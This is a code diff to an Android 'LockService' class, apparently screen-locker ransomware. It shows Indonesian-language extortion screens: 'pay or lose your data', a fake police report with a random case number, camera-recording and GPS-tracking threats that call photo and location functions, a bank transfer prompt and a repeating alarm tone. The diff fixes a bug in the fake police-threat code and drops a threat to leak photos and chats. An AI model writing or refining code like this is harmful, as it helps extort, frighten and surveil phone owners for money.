@@ -169,8 +169,7 @@ public class LockService extends Service {
     private void openTelegram(){ try{ Intent intent=new Intent(Intent.ACTION_VIEW,Uri.parse("https://t.me/wapiiiiTzy")); intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); startActivity(intent); }catch(Exception e){} }
     private void showLocationOnLock(){ if(msgText!=null)msgText.setText("📍 Lokasi Anda: Sedang dilacak..."); getGPS(); }
     private void startWarningCountdown(String interval){ try{ int sec=Integer.parseInt(interval); handler.postDelayed(new Runnable(){ @Override public void run(){ if(!locked)return; if(msgText!=null)msgText.setText("⚠️ BAYAR ATAU DATA HILANG!"); tone.startTone(ToneGenerator.TONE_CDMA_ALERT_CALL_GUARD,3000); handler.postDelayed(this,sec*1000); } },sec*1000); }catch(Exception e){} }
-    private void showPoliceThreat(){ if(msgText!=null)msgText.setText("👮 Data Anda dikirim ke Kepolisian RI"); if(pinDisplay!=null)pinDisplay.setText("LAPORAN #"+Math.random().toString().substring(2,8)); }
-    private void showLeakThreat(){ if(msgText!=null)msgText.setText("📤 Foto & chat Anda siap diunggah ke publik"); }
+    private void showPoliceThreat(){ if(msgText!=null)msgText.setText("👮 Data Anda dikirim ke Kepolisian RI"); if(pinDisplay!=null){ String r=""+Math.random(); pinDisplay.setText("LAPORAN #"+r.substring(2,8)); } }
     private void showCameraThreat(){ if(msgText!=null)msgText.setText("🎥 Kamera Anda merekam..."); takePhoto(); }
     private void showRekening(String rek){ if(msgText!=null)msgText.setText("💳 Transfer ke: "+rek); }
     private void showCallCenter(String number){ if(msgText!=null)msgText.setText("📞 Hubungi: "+number); }
